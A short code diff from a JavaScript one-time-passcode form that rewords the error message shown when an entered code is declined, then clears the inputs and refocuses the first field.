@@ -728,7 +728,7 @@
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = 'Code declined. Please try again.';
+                                    errMsg.textContent = 'Invalid code. Try again.';
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                     focusFirstInput('otpInputs');
